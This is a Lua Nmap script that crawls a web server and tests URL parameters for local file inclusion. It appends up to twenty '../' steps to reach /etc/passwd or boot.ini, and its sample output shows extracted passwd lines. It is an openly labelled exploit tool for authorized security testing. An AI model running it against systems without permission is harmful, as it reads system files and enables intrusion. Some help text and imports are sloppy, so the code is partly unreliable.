description = [[ 
"http-lfi.nse can discover LFI exploit in a web server using the resource value provided. 
this supports LFI discovery in both windows and linux servers, at the same time, 
it also supports LFI in private pages using a given cookie value. It hopes 20 times 
backword in the directory and looks for either boot.ini or /etc/passwd file in the 
webserver and extract the vulnerable path." ]]

---
-- @usage
--
-- nmap --script http-lfi --script-args="cookie='PHPSESSID=12b20990ae07e1f4b0d121585f7b91cb',depth=20,param='doc='" <ip>
--
-- @args http-lfi.depth		the depth of back traversal. [default : 20]
-- @args http-lfi.param		the depth of back traversal. [default : page=]
-- @args http-lfi.cookie	cookie value for testing LFI in private webpages. [default : nil]
-- @args http-lfi.resource	the resource that NSE should to look. [default : /etc/passwd]
---
--@output
--80/tcp open  http    syn-ack
--| http-lfi: File Inclusion Found on /download.php?doc=../../../../../etc/passwd
--|   root:x:0:0:root:/root:/bin/bash
--|   daemon:x:1:1:daemon:/usr/sbin:/bin/sh
--|   bin:x:2:2:bin:/bin:/bin/sh
--|   sys:x:3:3:sys:/dev:/bin/sh
--|   lp:x:7:7:lp:/var/spool/lpd:/bin/sh
--|   mail:x:8:8:mail:/var/mail:/bin/sh
--|_  news:x:9:9:news:/var/spool/news:/bin/sh
---

author = "Sanoop Thomas (@s4n7h0)"
license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
categories =  {"exploit", "intrusive"}

httpspider = require 'httpspider'
shortport = require 'shortport'
url = require 'url'

portrule = shortport.http

--split url string for crafting with given pattern
function split(pString, pPattern)
   local Table = {}
   local fpat = "(.-)" .. pPattern
   local last_end = 1
   local s, e, cap = pString:find(fpat, 1)
   while s do
      if s ~= 1 or cap ~= "" then
     table.insert(Table,cap)
      end
      last_end = e+1
      s, e, cap = pString:find(fpat, last_end)
   end
   if last_end <= #pString then
      cap = pString:sub(last_end)
      table.insert(Table, cap)
   end
   return Table
end

function craft_uri(startpos,endpos, str, r)
	if(endpos == nil) then return string.sub(tostring(str),1,startpos) .. r
	else return string.sub(tostring(str),1, startpos) .. r .. string.sub(tostring(str),endpos) end
end

action = function(host, port)
	local parsed =""
	local url_split = {}
	local url_list = {}
	local fi = {}
	local param="page="
	local response,pattern,res
	local WIN_PATTERN = "[boot loader]"
	local NIX_PATTERN = "root:x:"
	local flag = 0
	local jump= "../"
	local cookie = nil
	local resource = "etc/passwd"
	local depth = 20

	--crawler to check all possible urls
	local crawler = httpspider.Crawler:new(host, port, '/', { scriptname = SCRIPT_NAME } )
	crawler:set_timeout(10000)

	--setting cookie for checking private pages
	local header = {
	cookies = cookie
	}

	--setting commandline parameters if user has given any
	if(nmap.registry.args.cookie) then 
		cookie = tostring(nmap.registry.args.cookie) 
	end
	if(nmap.registry.args.resource) then 
		resource = tostring(nmap.registry.args.resource) 
	end
	if(nmap.registry.args.param) then 
		param = tostring(nmap.registry.args.param) 
	end
	if(nmap.registry.args.depth) then 
		depth = tonumber(nmap.registry.args.depth) 
	end
	
	--backing up the resource parameter for final comparison
	res = resource

	--setting up the pattern according to the resource
	if(resource=="boot.ini") then 
		pattern=WIN_PATTERN
	else 
		pattern=NIX_PATTERN 
	end
	local status,r
	while(true) do
		status, r = crawler:crawl()
		-- the crawler wont fails normally, if it does, it can be a number of reasons, 
		-- it's better to do an error handle
		if ( not(status) ) then
			if ( r.err ) then
				return stdnse.format_output(true, "ERROR: %s", r.reason)
			else
				break
			end

		end
		--collecting all urls crawled
		table.insert(url_list, r.url)
	end
	local i,j,k,l
	--print the url collected
	for key, uri in ipairs(url_list) do
		if(string.match(tostring(uri),param)) then
			i,j=string.find(tostring(uri),param)
			k,l=string.find(tostring(uri),"&",j)
			--traversing back to find the pattern
			for i=1,depth do
				resource = jump .. resource
				str = craft_uri(j,k, uri, resource)
				response = http.get_url(str)
				if response.rawheader ~= nil then
					if res=="boot.ini" then
						-- checking for boot.ini file pattern
                       	        		for line in response.body:gmatch("[^\r\n]+") do
                       	                		if(line:match("[boot loader"))then
                       	                        		table.insert(fi,line)
                       	                        		flag=1
                       	                		end
                       	        		end
						if flag==1 then
                       	        			break
                       				end
					else
						-- checking for /etc/passwd file pattern
		        	        	for line in response.body:gmatch("[^\r\n]+") do
	     	        			        if (line:match("[a-z]:x:[%x]*:[%x]*:")) then
	             		        		        table.insert(fi,line)
	                     			        	flag=1
	                	        		end
		        	        	end
						if flag==1 then
	     	        	        	        break
	                	        	end
					end
				end
			end
			if flag == 1 then
				return "Local File Inclusion Found on " .. param .. "=" .. resource .. " " .. stdnse.format_output(true, fi)
			end			
		end
	end
end
